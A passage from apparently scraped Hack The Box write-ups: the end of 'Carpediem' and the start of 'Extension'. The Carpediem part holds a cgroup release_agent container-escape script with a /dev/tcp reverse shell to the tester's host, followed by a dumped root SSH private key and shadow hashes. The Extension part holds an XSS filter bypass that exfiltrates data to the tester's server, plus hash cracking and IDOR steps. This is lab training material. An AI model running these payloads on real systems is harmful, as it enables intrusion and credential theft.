linpeas.sh \n\n══╣ Breakout via mounts\n╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts\n═╣ release_agent breakout 1........ Yes\nSteal the script from HackTricks, upload it and run doesn’t work either..\n➜  carpediem cat esc.sh \n# Finds + enables a cgroup release_agent\n# Looks for something like: /sys/fs/cgroup/*/release_agent\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\n# If \"d\" is empty, this won't work, you need to use the next PoC\n\n# Enables notify_on_release in the cgroup\nmkdir -p $d/w;\necho 1 &gt;$d/w/notify_on_release\n# If you have a \"Read-only file system\" error, you need to use the next PoC\n\n# Finds path of OverlayFS mount for container\n# Unless the configuration explicitly exposes the mount point of the host filesystem\n# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html\nt=`sed -n 's/overlay \\/ .*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\n\n# Sets release_agent to /path/payload\ntouch /o; echo $t/c &gt; $d/release_agent\n\n# Creates a payload\necho \"#!/bin/sh\" &gt; /c\necho \"ps &gt; $t/o\" &gt;&gt; /c\nchmod +x /c\n\n# Triggers the cgroup via empty cgroup.procs\nsh -c \"echo 0 &gt; $d/w/cgroup.procs\"; sleep 1\n\n# Reads the output\ncat /o\n\n\n# wget http://10.10.14.10/esc.sh\n# chmod +x esc.sh\n# bash esc.sh\nmkdir: cannot create directory '/sys/fs/cgroup/rdma/w': Read-only file system\nesc.sh: line 11: /sys/fs/cgroup/rdma/w/notify_on_release: No such file or directory\nesc.sh: line 20: /sys/fs/cgroup/rdma/release_agent: Read-only file system\nsh: 1: cannot create /sys/fs/cgroup/rdma/w/cgroup.procs: Directory nonexistent\nAfter a bit more investigating I come across this post about CVE-2022-0492 explaining how we can create new user namespace and cgroup namespace using unshare -UrmC bash, and then be able to mount the cgroupfs.\n\n“.. in the container we execute unshare to create new user namespace and cgroup namespace. Then we can mount the cgroupfs and write our data to release_agent.”\n\nSo lets jump back to the first escape from Blackhat, this time using unshare to create new namespaces.\n# wget http://10.10.14.10/esc.sh\n# chmod +x esc.sh\n# cat esc.sh\nmkdir /tmp/esc\nmount -t cgroup -o rdma cgroup /tmp/esc\nmkdir /tmp/esc/w\necho 1 &gt; /tmp/esc/w/notify_on_release\npop=\"$overlay/shell.sh\"\necho \"bash -i &gt;& /dev/tcp/10.10.14.10/4400 0&gt;&1\" &gt; /shell.sh\nchmod +x /shell.sh\necho $pop &gt; /tmp/esc/release_agent\nsleep 5 && echo 0&gt;/tmp/esc/w/cgroup.procs &\n\n# unshare -UrmC bash\nbash esc.sh\nNothing happens.. I really don’t understand the $overlay part, echoing it returns nothing. Investigating this further we find another, very similar, PoC: \nWith some trial-and-error I got the escape working, for me the issue was my payload - so make sure to test it before incorporating it to a exploit.\n# unshare -UrmC bash\nwget http://10.10.14.10/esc.sh\nchmod +x esc.sh\n\n\ncat esc.sh\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\necho 1 &gt; /tmp/cgrp/x/notify_on_release\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\necho \"$host_path/cmd\" &gt; /tmp/cgrp/release_agent\n\necho '#!/bin/sh' &gt; /cmd\necho \"/bin/bash -c 'bash -i &gt;& /dev/tcp/10.10.14.10/4400 0&gt;&1'\" &gt;&gt; /cmd\nchmod a+x /cmd\n\nsh -c \"echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs\"\nhead /output\n\n\nbash esc.sh\n➜  carpediem nc -lvnp 4400            \nlistening on [any] 4400 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.167] 56780\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@carpediem:/# id && hostname\nuid=0(root) gid=0(root) groups=0(root)\ncarpediem\n\nroot@carpediem:/# cat /root/root.txt\nc57deb2eb7b17c84a0e40dc099b0bb70\n\nroot@carpediem:/# cat /root/.ssh/id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n\nroot@carpediem:/# cat /etc/shadow\nroot:$6$y5QrvfE3csMMok1t$DvYGED3VsftC3ylIHA8yGVg2j2KiP7uooPn309LahXXPEZulnVWBwwKLorPdiW5snCgWEYN6F24b8LQALG1CD1:19081:0:99999:7:::\nhflaccus:$6$Y3pKa50HWcGkr/KE$ZBG57pq5RIwDs9l75xJMz5Cv2SweVTFOcsv3WzRLC9c/QRX7wSgNT/XekUYEx"
  },
  {
    "objectID": "posts/2022-09-11-htb-writeup-extension/2022-09-11-htb-writeup-extension.html",
    "href": "posts/2022-09-11-htb-writeup-extension/2022-09-11-htb-writeup-extension.html",
    "title": "Extension - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\n➜  extension nmap -Pn -n -p- 10.10.11.171 \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 15:49 CEST\nNmap scan report for 10.10.11.171\nHost is up (0.025s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n➜  extension nmap -Pn -n -p22,80 -sCV 10.10.11.171 \nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 82:21:e2:a5:82:4d:df:3f:99:db:3e:d9:b3:26:52:86 (RSA)\n|   256 91:3a:b2:92:2b:63:7d:91:f1:58:2b:1b:54:f9:70:3c (ECDSA)\n|_  256 65:20:39:2b:a7:3b:33:e5:ed:49:a9:ac:ea:01:bd:37 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-title: snippet.htb\n|_http-server-header: nginx/1.14.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNote the title - snippet.htb, add it to /etc/hosts\n\n➜  extension ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://snippet.htb -H \"Host: FUZZ.snippet.htb\" -fw 1022\ndev                     [Status: 200, Size: 12822, Words: 1029, Lines: 250, Duration: 33ms]\nmail                    [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 750ms]\n\nWe find 2 vhosts using fuff, add them to /etc/hosts\n\n➜  webanalyze ./webanalyze -host http://snippet.htb\nhttp://snippet.htb (0.4s):\n    Google Font API,  (Font scripts)\n    Ubuntu,  (Operating systems)\n    Nginx, 1.14.0 (Web servers, Reverse proxies)\n\n➜  webanalyze ./webanalyze -host http://dev.snippet.htb\nhttp://dev.snippet.htb (0.3s):\n    Nginx, 1.14.0 (Web servers, Reverse proxies)\n    Ubuntu,  (Operating systems)\n    Gitea,  (Development)\n    \n➜  webanalyze ./webanalyze -host http://mail.snippet.htb\nhttp://mail.snippet.htb (0.2s):\n    Bootstrap,  (UI frameworks)\n    RoundCube,  (Webmail)\n    PHP,  (Programming languages)\n    Nginx, 1.14.0 (Web servers, Reverse proxies)\n    Ubuntu,  (Operating systems)\n    PHP, 7.4.27 (Programming languages)\nWe have a lot to cover here, but lets start with the standard snippet.htb.\nLooking on the webpage we find three potential users at the bottom of the frontpage - Charlie Rooper, Jean Castux and Thierry Halliday. It could be a good idea to add these to a file and use namemash.py to find potential usernames.\nPressing the big “Get started” button takes us to /login where {} is written above the login form for some reason. I remember when checking a HTB Tournament way back, the creators wrote {} in the http-title to hint that there should be SSTI on that particular page - maybe that’s the case here as well? Or I might just overanalyze and {} is logo for snippet.\nThe symbols appear on all browsable sites; /login, /forgot-password and register.\n\nLooking on /forgot-password it seems like we can enumerate users, a invalid user will provide the error message “no valid recipients” while a valid user will return “We have emailed you password reset link!”.\n\n\nWe can confirm that both charlie@snippet.htb and jean@snippet.htb are valid users, however thierry@snippet.htb is not. Trying a bunch of different authentication bypass techniques with username charlie@snippet.htb locks the account for 60 seconds, so that’s not the way to go.\nTrying to register a new account we’re met with the error “Registration not allowed at this moment!”, could it be that they disabled the feature as it’s vulnerable, or is it just a rabbit hole?\nPlaying around with the registration feature in Burp Suite I find nothing of use, lets leave it for now.\n➜  extension ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://snippet.htb/FUZZ\n.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 51ms]\n.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 57ms]\ncgi-bin/                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 30ms]\ncss                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 35ms]\ndashboard               [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1775ms]\nfavicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 29ms]\nforgot-password         [Status: 200, Size: 37782, Words: 1022, Lines: 30, Duration: 1492ms]\nimages                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 670ms]\njs                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 29ms]\nlogin                   [Status: 200, Size: 37797, Words: 1022, Lines: 30, Duration: 1672ms]\nlogout                  [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 2580ms]\nnew                     [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1189ms]\nregister                [Status: 200, Size: 37745, Words: 1022, Lines: 30, Duration: 1096ms]\nreset-password          [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 1891ms]\nserver-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 30ms]\nsnippets                [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1311ms]\nusers                   [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1633ms]\nTrying to fuzz anything after /snippets all return 302’s, while testing both /users and /dashboard we get 404’s. However I find nothing more. Looking at the source code of index.php we find this huge script block which starts with all (?) functions on the site, including some we haven’t found yet.\nconst Ziggy = {\n    \"url\": \"http:\\/\\/snippet.htb\",\n    \"port\": null,\n    \"defaults\": {},\n    \"routes\": {\n    [... snip ...]\n        \"users\": {\n            \"uri\": \"users\",\n            \"methods\": [\"GET\", \"HEAD\"]\n        },\n    [... snip ...]\n        \"snippets.update\": {\n            \"uri\": \"snippets\\/update\\/{id}\",\n            \"methods\": [\"GET\", \"HEAD\"]\n        },\n        \"api.snippets.update\": {\n            \"uri\": \"snippets\\/update\\/{id}\",\n            \"methods\": [\"POST\"]\n        },\n        \"api.snippets.delete\": {\n            \"uri\": \"snippets\\/delete\\/{id}\",\n            \"methods\": [\"DELETE\"]\n        },\n        \"snippets.new\": {\n            \"uri\": \"new\",\n            \"methods\": [\"GET\", \"HEAD\"]\n        },\n        \"users.validate\": {\n            \"uri\": \"management\\/validate\",\n            \"methods\": [\"POST\"]\n        },\n        \"admin.management.dump\": {\n            \"uri\": \"management\\/dump\",\n            \"methods\": [\"POST\"]\nFuntion admin.management.dump seems very interesting, we can only reach it through POST so we have to play around with cURL / fuff / Burp.\nHere I was stuck for a while trying to fuzz the data object, I know that I need to include the Cookie-, X-XSRF-TOKEN- and Content-type headers, but when it comes to the data object I am clueless. After fuzzing the key and filtering with Burp I finally managed to find something:\nRequest:\n\nResponse:\n\nThe key download returns “Unknown tablename” while all other keys return “Missing arguments”, we’ve got something! Lets continue to fuzz the value field and we quickly find the variable users, from which we extract 800+ users with their password hash.\n\n\n\nStep 2\nCopy all json data to file and format it using json.tool:\n➜  extension python3 -m json.tool temp_download_users.json &gt; snippet_users.json\nLooking for high value targets we find that Charlie is the only manager on the site:\n➜  extension cat snippet_users.json | grep -B10 Manager\n[\n    {\n        \"id\": 1,\n        \"name\": \"Charlie Rooper\",\n        \"email\": \"charlie@snippet.htb\",\n        \"email_verified_at\": \"2022-01-02 20:12:46\",\n        \"password\": \"30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82\",\n        \"remember_token\": \"T8hTcYuS7ULTi73eYg7ZHhncyNucDKQb3VaUDfcotdEGaDESr3YsP9xUlJEQ\",\n        \"created_at\": \"2022-01-02 20:12:47\",\n        \"updated_at\": \"2022-06-20 14:46:28\",\n        \"user_type\": \"Manager\"\nJean that we also found earlier is a member, her hash/token/information might come in handy later on.\n➜  extension cat snippet_users.json | grep -a10 jean\n    {\n        \"id\": 664,\n        \"name\": \"Jean Castux\",\n        \"email\": \"jean@snippet.htb\",\n        \"email_verified_at\": \"2022-01-02 20:15:30\",\n        \"password\": \"7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6\",\n        \"remember_token\": \"naXzYffXKP\",\n        \"created_at\": \"2022-01-02 20:15:37\",\n        \"updated_at\": \"2022-01-02 20:15:37\",\n        \"user_type\": \"Member\"\n    },\nTrying to crack all hashes we only get one hit:\n➜  extension grep password snippet_users.json | awk -F\\\" '{print $4}' &gt; tmp_hashes\n➜  extension grep 'email\"' snippet_users.json | awk -F\\\" '{print $4}' &gt; tmp_email\n➜  extension paste -d \":\" tmp_email tmp_hashes &gt; snippet_users.hash\n\n➜  extension hashcat -a0 -m1400 snippet_users.hash /usr/share/wordlists/rockyou.txt --user\n[... snip ...]\nef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123\n\n➜  extension hashcat -a0 -m1400 snippet_users.hash /usr/share/wordlists/rockyou.txt --user --show\nletha@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123\nfredrick@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123\ngia@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123\njuliana@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123\nTesting to login with credentials letha@snippet.htb:password123 and we gain access to the application:\n\nBrowsing snippets we find one public (http://snippet.htb/snippets/1) from Isaac Heller named “JavaScript get clipboard”:\nfunction getClipBoard() {\n    const el = document.createElement(\"div\");\n    document.body.appendChild(el);\n    el.contentEditable = true;\n    el.style = {position: 'absolute', left: '-9999px'};\n\n    const range = document.createRange();\n    range.selectNode(el);\n    window.getSelection().removeAllRanges();\n    window.getSelection().addRange(range);\n    el.focus();\n    document.execCommand(\"paste\");\n    return el.innerHTML;\n}\nBrowsing to http://snippet.htb/snippets/2 we find another snippet from Jean named “Gitea API”, however we’re not authorized to view it.\n\n\nStep 3\nThe application is vulnerable to a pretty simple exploit where we utilize the edit function. Create a new snippet, the content is irrelevant, and head over to Browse Snippets. Press edit and UPDATE without editing to capture the POST request in Burp.\nThe post body will look something like this:\n{\"name\":\"sdf\",\"content\":\"I only write in D\",\"language\":\"D\",\"public\":true}\nNow simply remove everything except \"public\":true and change the address from /snippets/update/&lt;id&gt; to /snippets/update/2 to make Jean’s snippet public.\n\nDecode the token to reveal Jeans credentials:\n➜  extension echo -n \"amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB\" | base64 -d\njean:EHmfar1Y7ppA9O5TAIXnYnJpA\nWith Jeans credentials we’re now able to access her email (mail.snippet.htb) and git (dev.snippet.htb), however SSH only accepts publickey.\nLogging into git we find an extension designed display the body of issues posted on internal repos, meaning we can post data that will be read by other team members. Looking through the code (inject.js) we find this filter in the end:\nfunction check(str) {\n    // remove tags\n    str = str.replace(/&lt;.*?&gt;/, \"\")\n\n    const filter = [\";\", \"\\'\", \"(\", \")\", \"src\", \"script\", \"&\", \"|\", \"[\", \"]\"]\n\n    for (const i of filter) {\n        if (str.includes(i))\n            return \"\"\n    }\n    return str\n}\nThe first &lt;&gt; tag is replaced with \"\", this only happens once since it’s not in a loop. Other then that, a bunch of words and characters are also filtered. The big thing here is the semi-colon as it removes most of the “standard” ways to steal cookies.\nTo test if we can get this XSS to work, I use this simple payload and wait for callbacks. &lt;replace-me&gt;&lt;img sRc=\"http://10.10.14.10?c=hello.xss\" /&gt;\n➜  extension python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.14.10 - - [08/Sep/2022 14:28:28] \"GET /?c=hello.xss HTTP/1.1\" 200 -\n10.10.11.171 - - [08/Sep/2022 14:30:32] \"GET /?c=hello.xss HTTP/1.1\" 200 -\nNow we just need to figure out what to steal, and how to do it.\n\n\nStep 4\nHere we have a few rules to follow, no parentheses and no semi colons. Googling around for XSS without parentheses I come across this gold mine or different XSS payloads. With a lot of trial and error and over 100+ tries later I finally succeed to find a payload that allows me to fetch() with my XSS:\n## Payload to b64 encode\nfetch('http://10.10.14.10/just-fetch')\n\n## Issues body\n&lt;remove-me&gt;&lt;img sRc=\"e\" onerror=eval.call`${\"eval\\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9qdXN0LWZldGNoJykK`\\x29\"}`&gt;\n\n## HTTP Server\n10.10.11.171 - - [09/Sep/2022 14:30:53] \"GET /just-fetch HTTP/1.1\" 404 -\nExpanding on the PoC I try to fetch the content of text file that I host, and then fetch again to “send” the data base64 encoded in the URL.\n➜  extension echo \"fetch('http://10.10.14.10/employees.txt').then(response =&gt; response.text()).then(data =&gt; fetch('http://10.10.14.10/'+btoa(data)))\" | base64\nZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9\nPiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEw\nLycrYnRvYShkYXRhKSkpCg==\n\n## Issues body\n&lt;remove-me&gt;&lt;img sRc=\"e\" onerror=eval.call`${\"eval\\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEwLycrYnRvYShkYXRhKSkpCg==`\\x29\"}`&gt;\n\n## HTTP Server\n10.10.11.171 - - [09/Sep/2022 15:28:29] \"GET /Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo= HTTP/1.1\" 404 -\n\n➜  extension echo \"Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo=\" | base64 -d\nCharlie Rooper\nJean Castux\nThierry Halliday\nWe got a solid XSS PoC where we’re able to exfiltrate data now we need to find a way to exploit this. Looking through the Gitea API docs we have a lot of options, the first that comes to mind is “GET /user” to show the authenticated user - in theory this should confirm what user is performing the XSS actions. To get a better understanding of the user performing my XSS calls lets see if we can extract any repo information using http://dev.snippet.htb/api/v1/repos/search.\n## Issues body\n&lt;remove-me&gt;&lt;img sRc=\"e\" onerror=eval.call`${\"eval\\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL3NlYXJjaCcpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\\x29\"}`&gt;\n\n## HTTP Server\n10.10.11.171 - - [10/Sep/2022 10:05:49] \"GET /eyJvayI6 [... snip ...]\n\n➜  extension echo \"eyJvayI6 [... snip ...]\" | base64 -d &gt; tmp_repos.txt\n➜  extension python3 -m json.tool tmp_repos.txt &gt; xss_repos.json\n➜  extension cat xss_repos.json \n{\n    \"ok\": true,\n    \"data\": [\n        {\n            \"id\": 2,\n            \"owner\": {\n                [... snip ...]\n                \"username\": \"charlie\"\n            },\n            \"name\": \"backups\",\n            \"full_name\": \"charlie/backups\",\n            \"description\": \"Backup of my home directory\",\n            [... snip ...]\n            \"html_url\": \"http://dev.snippet.htb/charlie/backups\",\n            \"ssh_url\": \"git@localhost:charlie/backups.git\",\n            \"clone_url\": \"http://dev.snippet.htb/charlie/backups.git\",\n            [... snip ...]\n            \"default_branch\": \"master\",\n            [... snip ...]\n            \"permissions\": {\n                \"admin\": true,\n                \"push\": true,\n                \"pull\": true\n            [... snip ...]\nThis seems very promising, charlie have a repo of his home directory and within we’ll hopefully find his id_rsa. Lets try to expand the XSS further to fetch(http://dev.snippet.htb/charlie/backups). Trying this for a few times and we get no callbacks, maybe the response is to big resulting in an error and hence no callbacks. Lets try to go right for the money instead, we can assume that id_rsa should be at http://dev.snippet.htb/charlie/backups/raw/branch/master/.ssh/id_rsa.\n10.10.11.171 - - [10/Sep/2022 10:27:30] \"GET /Tm90IGZvdW5kLgo= HTTP/1.1\" 404 -\n\n➜  extension echo \"Tm90IGZvdW5kLgo=\" | base64 -d\nNot found.\nIt is not.. nor is it directly at http://dev.snippet.htb/charlie/backups/raw/branch/master/id_rsa.. Instead of guessing blindly we can do a GET request to list the contents of the backups repo:\n## Issues body\n&lt;remove-me&gt;&lt;img sRc=\"e\" onerror=eval.call`${\"eval\\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\\x29\"}`&gt;\n\n## HTTP Server\n10.10.11.171 - - [10/Sep/2022 11:28:09] \"GET /W3sibmFtZSI6 [... snip ...]\n\n➜  extension echo \"W3sibmFtZSI6 [... snip ...]\" | base64 -d &gt; tmp_backups-content.txt\n➜  extension python3 -m json.tool tmp_backups-content.txt &gt; xss_repo-backups-content.json\n➜  extension cat xss_repo-backups-content.json\n[\n    {\n        \"name\": \"backup.tar.gz\",\n        \"path\": \"backup.tar.gz\",\n        \"sha\": \"c25cb9d1f1d83bdad41dad403874c2c9b91d0b57\",\n        \"type\": \"file\",\n        \"size\": 4316,\n        \"encoding\": null,\n        \"content\": null,\n        \"target\": null,\n        \"url\": \"http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master\",\n        \"html_url\": \"http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz\",\n        \"git_url\": \"http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57\",\n        \"download_url\": \"http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz\",\n        \"submodule_git_url\": null,\n        \"_links\": {\n            \"self\": \"http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master\",\n            \"git\": \"http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57\",\n            \"html\": \"http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz\"\n        }\n    }\n]\nWe find a nice download_url go at it one last time and fetch(http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz). At this point I noticed a problem, the base64 created to download backup.tar.gz contained + signs and all payloads containing + had not worked - neither did this one.. So instead I aimed for http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57 and thank god no + and we’re able to extract the content.\n## Issues body\n&lt;remove-me&gt;&lt;img sRc=\"e\" onerror=eval.call`${\"eval\\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9naXQvYmxvYnMvYzI1Y2I5ZDFmMWQ4M2JkYWQ0MWRhZDQwMzg3NGMyYzliOTFkMGI1NycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\\x29\"}`&gt;\n\n## HTTP Server\n10.10.11.171 - - [10/Sep/2022 11:46:20] \"GET /eyJjb250 [... snip ...]\n\n➜  extension echo \"eyJjb250 [... snip ...]\" | base64 -d &gt; tmp_backups.txt\n➜  extension python3 -m json.tool tmp_backups.txt &gt; xss_backups-blob.json\n➜  extension cat xss_backups-blob.json\n{\n    \"content\": \"H4sIANO61GEAA [... snip ...]\",\n    \"encoding\": \"base64\",\n    \"url\": \"http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57\",\n    \"sha\": \"c25cb9d1f1d83bdad41dad403874c2c9b91d0b57\",\n    \"size\": 4316\n}\n\n➜  extension echo \"H4sIANO61GEAA [... 